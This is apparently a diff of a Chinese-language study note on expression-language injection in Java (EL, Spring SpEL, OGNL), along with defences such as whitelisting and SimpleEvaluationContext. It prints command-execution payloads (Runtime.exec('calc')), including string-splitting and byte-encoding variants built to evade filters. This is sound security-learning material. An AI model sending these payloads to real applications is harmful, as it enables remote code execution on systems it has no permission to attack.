@@ -1,5 +1,5 @@
 OGNL(struts2)、SpEL(spring)、MVEL、EL、Fel、JSTL+EL等
-## **EL表达式**
+# **EL表达式**
 原生EL（Expression Language）表达式 是为了使JSP写起来更加简单。
 ```
 //执行命令
@@ -8,7 +8,7 @@ ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEng
 
 
 ^
-## **Spring的SpEL表达式注入**
+# **Spring的SpEL表达式注入**
 <https://xie.infoq.cn/article/66d003327e05ab4528fca5a41>
 ```
 把字符串当做代码执行。
@@ -32,21 +32,10 @@ expression.getValue(context);
 CVE复现：<https://cloud.tencent.com/developer/article/2144995>
 防御：使用时做白名单，只有需要的字符串才能当作代码执行。
 
-# SpEL参考文档
-- https://cloud.tencent.com/developer/article/1676200
-- https://www.cnblogs.com/xfeiyun/p/16914131.html
-- https://juejin.cn/post/7117839866523549710#heading-2
-# AOP讲解
-- https://www.liaoxuefeng.com/wiki/1252599548343744/1266265125480448
-- https://pdai.tech/md/spring/spring-x-framework-aop.html#google_vignette
 
-# SpEl + AOP 实现日志记录
-- https://blog.csdn.net/ke7025/article/details/122185525
 
-# SpEL 注入
-<https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/>
 
-# SpEL表达式 #{} 和 {} 和 # 和 '' 的使用
+### SpEL表达式 #{} 和 {} 和 # 和 '' 的使用
 1. #{} 表达式
    #{} 用于在 Spring 配置文件中表示需要解析的 SpEL 表达式。主要用于注解、XML 配置和属性文件中，通常在需要动态计算的场景下使用。
 ```java 
@@ -70,7 +59,7 @@ String result = parser.parseExpression("'Hello ' + 'World'").getValue(String.cla
 ```
 4. `{}`   
     花括号 {} 通常用于在集合、数组或映射中表示集合字面量。以下是一些具体的用法和示例。
-# Spel注入  
+### Spel注入  
 存在Spel注入的前提是存在SpEl相关的库，如下是相关的库
 ```java
 org.springframework.expression.spel.standard
@@ -89,8 +78,8 @@ T(java.lang.Runtime).getRuntime().exec("calc.exe");
 
  ```
 
-## 构造payload
-```java
+### 构造payload
+```
 T(java.lang.Ru" + "ntime).getRuntime().exec('calc');
 String spel = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))" +".invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")" +".getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()" +".forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})\n";
 new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("java.lang.Runtime.getRuntime().exec('calc')")";
@@ -98,13 +87,15 @@ T(java.lang.Runtime).getRuntime().exec("calc")
 T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))
 ```
 
-# Spel 防御
-##  使用 SimpleEvaluationContext
+## Spel 防御
+使用 SimpleEvaluationContext
 ```java
 SpelExpressionParser parser = new SpelExpressionParser();
 SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
 expression.setValue(context, "payload");
 ```
 
-##  白名单过滤
-略
+
+
+^
+# **OGNL(struts2)表达式注入**
